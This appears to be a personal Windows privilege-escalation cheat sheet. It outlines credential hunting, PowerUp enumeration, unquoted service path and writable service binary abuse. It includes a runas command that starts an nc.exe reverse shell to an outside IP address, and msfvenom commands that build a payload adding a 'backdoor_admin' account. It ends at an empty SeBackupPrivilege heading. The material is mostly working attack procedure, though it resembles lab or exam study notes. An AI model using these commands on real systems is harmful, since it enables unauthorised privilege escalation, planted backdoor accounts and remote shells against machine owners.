1) Credentials access

2) Exploits

3) Missconfiguration



---------------------------------------------------------------------------
1) Credentials access
	a) Reused Passwords
	b) Credentials from configuration files
	c) Credentials from local dabases
	d) Credentials from cmdkey
	e) Credentials fom registers
	f) Credentials from unattend or Systprep Files
	g) Credentials from Log Files
	h) User Groups
	 
2) Exploits
	a) Services running on localhost
	b) Kernel version 
	c) Software versions
	d) Service Versions	

3) Missconfiguration	
	a) user privilegs
	b) Services 
			- unqueted service path
			- change service binary location
			- overwrite service binary
			- DLL hijacking
	c) AlwaysInstallElevated Set in Registry
	d) Sheduled Tasks
			- Executable File writable
			- Dependency writable
	e) Sensitive Files Readable
			- Sam Hive
			- System Hive			




--------------------------------------------------------------------------------------------------------------------------------------------------------
step:
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
	whoami /priv
	netstat â€“nao
	dir C:\Windows\System32\config\RegBack\SAM
	dir C:\Windows\System32\config\RegBack\SYSTEM


	find passwords:
		C:\Users\Public>reg query HKLM /f pass /t REG_SZ /s 
		
		
		
--------------------------------------------------------------------------------------------------------------------------------------------------------
Sth extra:

Use PowerUp (part of PowerSploit)

> Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
> Import-Module (Resolve-Path('PowerUp.ps1'))
>Invoke-AllChecks

>Import-Module PowerUp.ps1
and now:	
	>Invoke-AllChecks  
or one module
	>Get-UnquotedService
	
-----------------------------
check users:
	>net user
	
-----------------------------
List installed KB's for SMBGhost:
C:\Users\nathan\Nexus\nexus-3.21.0-05>wmic qfe list

-----------------------------
I have administrator password:
C:\Users\viewer>runas /env  /profile /user:STH\Administrator "C:\Users\viewer\nc.exe -e cmd.exe 192.168.49.140 5555"


--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
Priv esc:
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------
Unquoted Service Path (used with high priviliges):	
	this is ok :
	"C:\Program Files\Some Program\program.exe"

	but if it is unquoted:
		C:\Program Files\Some Program\program.exe

	computer can be interpreted as:
	this is program 	
		C:\Program.exe 
	this is arguments:
		 Files\Some Program\program.exe
	
	or this is program:
		C:\Program.exe Files\Some
	this is argument Program\program.exe

	or at last
		C:\Program Files\Some Program\program.exe
	
You can set program :	
	C:\Program.exe  which will give you high priviliges 

PowerUp output:
	ModifiablePath : @(ModifiablePath=C.:\ ..	
	AbuseFunction : Write-ServiceBinary -Name 'VulnServiceName' Path  <HijackPath>


	generate payload (it can be reverse shell but in heat I add new user)
		:~$ msfvenom -p windows/adduser USER=backdoor_admin PASS=Password! -f exe serviceName.exe 
		cp real service and replace payload with real sevice with name withou blan space like Program.exe 
	
	restart service or machine to restart service.
	
--------------------------------------------------------------------------------------------------------------------------------------------------------
Writable service (overwrite service binary):
	check services:
		PS C:\> wmic service get name,startname,pathname
	but beter use powerUp:	
			output: 
			 Modifiable Service Files	Install-ServiceBinary -Name '... 
	
	We can check service with:
		Install-ServiceBinary -Name "SomeVulnServiceName"		 
			 
	
	generate payload (it can be reverse shell but in heat I add new user)
		:~$ msfvenom -p windows/adduser USER=backdoor_admin PASS=Password! -f exe serviceName.exe 
		cp real service and replace payload with real sevice
					

--------------------------------------------------------------------------------------------------------------------------------------------------------
SeBackupPrivilige
	
	







